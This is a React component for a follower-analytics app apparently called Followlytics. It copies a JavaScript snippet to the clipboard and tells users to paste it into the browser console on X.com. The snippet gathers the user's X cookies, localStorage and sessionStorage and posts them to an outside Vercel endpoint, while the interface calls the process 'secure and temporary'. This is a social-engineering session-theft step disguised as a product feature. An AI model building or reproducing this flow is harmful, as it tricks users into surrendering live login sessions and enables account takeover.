'use client'

import { useState, useEffect } from 'react'
import { useAuth } from '@/hooks/useAuth'

export default function XSessionCaptureSimple() {
  const { user } = useAuth()
  const [sessionStatus, setSessionStatus] = useState<'none' | 'captured' | 'expired'>('none')
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    checkSessionStatus()
  }, [user])

  const checkSessionStatus = async () => {
    if (!user) return

    try {
      const token = await user.getIdToken()
      const response = await fetch('/api/auth/x-session-status', {
        headers: {
          'Authorization': `Bearer ${token}`,
        },
      })

      if (response.ok) {
        const data = await response.json()
        setSessionStatus(data.hasValidSession ? 'captured' : 'none')
      }
    } catch (error) {
      console.error('Error checking session status:', error)
    } finally {
      setLoading(false)
    }
  }

  const [showCaptureInstructions, setShowCaptureInstructions] = useState(false)

  const openXForSessionCapture = () => {
    // Open X.com in a new tab with instructions
    const newTab = window.open('https://x.com', '_blank')
    
    if (newTab) {
      setShowCaptureInstructions(true)
    } else {
      alert('Please allow popups and try again.')
    }
  }

  const confirmLoggedIn = async () => {
    if (!user) return

    try {
      setLoading(true)
      
      // Show the console script for the user to run on X.com
      const script = `
// STEP 1: Make sure you're on x.com and logged in
if (!window.location.hostname.includes('x.com') && !window.location.hostname.includes('X.com')) {
  alert('❌ Please run this on x.com');
} else {
  // STEP 2: Capture session data
  console.log('🔐 Capturing X session...');
  
  const cookies = {};
  document.cookie.split(';').forEach(cookie => {
    const [name, value] = cookie.trim().split('=');
    if (name && value) cookies[name] = value;
  });
  
  const localStorage = {};
  for (let i = 0; i < window.localStorage.length; i++) {
    const key = window.localStorage.key(i);
    localStorage[key] = window.localStorage.getItem(key);
  }
  
  const sessionStorage = {};
  for (let i = 0; i < window.sessionStorage.length; i++) {
    const key = window.sessionStorage.key(i);
    sessionStorage[key] = window.sessionStorage.getItem(key);
  }
  
  const sessionData = {
    cookies,
    localStorage,
    sessionStorage,
    userAgent: navigator.userAgent,
    url: window.location.href,
    timestamp: new Date().toISOString()
  };
  
  // STEP 3: Send to Followlytics
  fetch('https://followlytics-zeta.vercel.app/api/auth/capture-x-session-direct', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ sessionData, userId: '${user.uid}' })
  })
  .then(response => response.json())
  .then(data => {
    if (data.success) {
      console.log('✅ Session captured successfully!');
      alert('✅ X session captured! You can close this tab and return to Followlytics.');
    } else {
      console.error('❌ Capture failed:', data.error);
      alert('❌ Capture failed: ' + data.error);
    }
  })
  .catch(error => {
    console.error('❌ Network error:', error);
    alert('❌ Network error: ' + error.message);
  });
}
      `

      // Copy script to clipboard and show instructions
      try {
        await navigator.clipboard.writeText(script)
        alert(`
✅ Script copied to clipboard!

Now:
1. Go to the X.com tab you opened
2. Make sure you're logged in
3. Open browser console (F12)
4. Paste the script (Ctrl+V) and press Enter
5. Wait for "✅ Session captured!" message
6. Come back here and refresh

The script is ready in your clipboard!
        `)
      } catch (e) {
        // Fallback if clipboard API fails
        const scriptWindow = window.open('', '_blank', 'width=700,height=500')
        if (scriptWindow) {
          scriptWindow.document.write(`
            <html>
              <head><title>X Session Capture Script</title></head>
              <body style="font-family: Arial, sans-serif; padding: 20px; background: #f5f5f5;">
                <div style="max-width: 600px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
                  <h2 style="color: #1d4ed8;">🔐 X Session Capture Script</h2>
                  <div style="background: #fef3c7; padding: 15px; border-radius: 6px; margin: 15px 0;">
                    <strong>📋 Instructions:</strong>
                    <ol style="margin: 10px 0; padding-left: 20px;">
                      <li>Go to X.com and make sure you're logged in</li>
                      <li>Open browser console (F12)</li>
                      <li>Copy and paste this entire script:</li>
                    </ol>
                  </div>
                  <textarea style="width: 100%; height: 300px; font-family: monospace; font-size: 12px; padding: 10px; border: 1px solid #ccc; border-radius: 4px;" readonly onclick="this.select()">${script}</textarea>
                  <div style="background: #dcfce7; padding: 15px; border-radius: 6px; margin: 15px 0;">
                    <strong>✅ After running the script:</strong>
                    <p style="margin: 5px 0;">You'll see "✅ Session captured!" - then return to Followlytics and refresh the page.</p>
                  </div>
                </div>
              </body>
            </html>
          `)
        }
      }

      setShowCaptureInstructions(false)
      
    } catch (error) {
      console.error('Error in session capture:', error)
      alert('Error preparing session capture. Please try again.')
    } finally {
      setLoading(false)
    }
  }

  const captureSessionManually = async () => {
    if (!user) return

    try {
      setLoading(true)
      
      // Prompt user to run a simple script in X.com console
      const script = `
// Copy and paste this into X.com console (F12):
(async function() {
  const cookies = {};
  document.cookie.split(';').forEach(cookie => {
    const [name, value] = cookie.trim().split('=');
    if (name && value) cookies[name] = value;
  });
  
  const localStorage = {};
  for (let i = 0; i < window.localStorage.length; i++) {
    const key = window.localStorage.key(i);
    localStorage[key] = window.localStorage.getItem(key);
  }
  
  const sessionData = {
    cookies,
    localStorage,
    userAgent: navigator.userAgent,
    url: window.location.href
  };
  
  console.log('Session data captured! Copy this and paste in Followlytics:');
  console.log(JSON.stringify(sessionData));
  
  // Also try to send directly if possible
  try {
    const response = await fetch('https://followlytics-zeta.vercel.app/api/auth/capture-x-session-direct', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ sessionData })
    });
    if (response.ok) {
      console.log('✅ Session sent directly to Followlytics!');
      alert('✅ Session captured successfully! You can close this tab.');
    }
  } catch (e) {
    console.log('Direct send failed, please copy the data above');
  }
})();
      `

      const userWantsScript = confirm(`
🔐 Manual Session Capture

To capture your X session:

1. Make sure you're logged into X.com
2. Open browser console on X.com (F12)
3. Paste the provided script
4. Follow the instructions

Would you like to see the script to copy?
      `)

      if (userWantsScript) {
        // Show script in a text area for easy copying
        const scriptWindow = window.open('', '_blank', 'width=600,height=400')
        if (scriptWindow) {
          scriptWindow.document.write(`
            <html>
              <head><title>X Session Capture Script</title></head>
              <body style="font-family: Arial, sans-serif; padding: 20px;">
                <h2>🔐 X Session Capture Script</h2>
                <p><strong>Instructions:</strong></p>
                <ol>
                  <li>Go to X.com and make sure you're logged in</li>
                  <li>Open browser console (F12)</li>
                  <li>Copy and paste this script:</li>
                </ol>
                <textarea style="width: 100%; height: 200px; font-family: monospace;" readonly>${script}</textarea>
                <p><strong>After running the script, come back to Followlytics and refresh the page.</strong></p>
              </body>
            </html>
          `)
        }
      }
    } catch (error) {
      console.error('Error in manual capture:', error)
    } finally {
      setLoading(false)
    }
  }

  if (loading) {
    return (
      <div className="p-4 bg-gray-50 border border-gray-200 rounded-lg">
        <div className="flex items-center">
          <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-blue-600"></div>
          <span className="ml-2 text-sm text-gray-600">Checking X session status...</span>
        </div>
      </div>
    )
  }

  if (sessionStatus === 'captured') {
    return (
      <div className="p-4 bg-green-50 border border-green-200 rounded-lg">
        <div className="flex items-center justify-between">
          <div className="flex items-center">
            <div className="flex-shrink-0">
              <svg className="h-5 w-5 text-green-400" viewBox="0 0 20 20" fill="currentColor">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
              </svg>
            </div>
            <div className="ml-3">
              <h3 className="text-sm font-medium text-green-800">
                ✅ X Session Active
              </h3>
              <p className="text-sm text-green-700">
                Your X authentication is captured and ready for follower scanning.
              </p>
            </div>
          </div>
          <button
            onClick={checkSessionStatus}
            className="text-green-600 hover:text-green-700 text-sm"
          >
            🔄 Refresh
          </button>
        </div>
      </div>
    )
  }

  return (
    <div className="p-4 bg-blue-50 border border-blue-200 rounded-lg">
      <div className="flex items-center justify-between">
        <div>
          <h3 className="text-sm font-medium text-blue-800">
            🔐 X Session Required
          </h3>
          <p className="text-sm text-blue-700 mt-1">
            To scan followers, we need to capture your X login session. This is secure and temporary.
          </p>
        </div>
        <div className="flex space-x-2">
          {!showCaptureInstructions ? (
            <>
              <button
                onClick={openXForSessionCapture}
                className="bg-blue-600 hover:bg-blue-700 text-white text-sm px-3 py-2 rounded"
              >
                🌐 Open X.com
              </button>
              <button
                onClick={captureSessionManually}
                className="bg-gray-600 hover:bg-gray-700 text-white text-sm px-3 py-2 rounded"
              >
                📋 Manual Capture
              </button>
            </>
          ) : (
            <button
              onClick={confirmLoggedIn}
              disabled={loading}
              className="bg-green-600 hover:bg-green-700 disabled:bg-green-400 text-white text-sm px-4 py-2 rounded"
            >
              {loading ? '🔄 Processing...' : '✅ I\'m Logged In'}
            </button>
          )}
        </div>
      </div>
      
      {showCaptureInstructions && (
        <div className="mt-4 p-3 bg-yellow-50 border border-yellow-200 rounded">
          <p className="text-sm text-yellow-800">
            <strong>📋 Next Steps:</strong>
          </p>
          <ol className="text-sm text-yellow-700 mt-1 list-decimal list-inside space-y-1">
            <li>Make sure you're logged into X.com in the new tab</li>
            <li>Navigate to your profile or followers page</li>
            <li>Come back here and click "✅ I'm Logged In"</li>
            <li>Follow the console script instructions</li>
          </ol>
          <button
            onClick={() => setShowCaptureInstructions(false)}
            className="mt-2 text-yellow-600 hover:text-yellow-700 text-sm underline"
          >
            Cancel
          </button>
        </div>
      )}
    </div>
  )
}


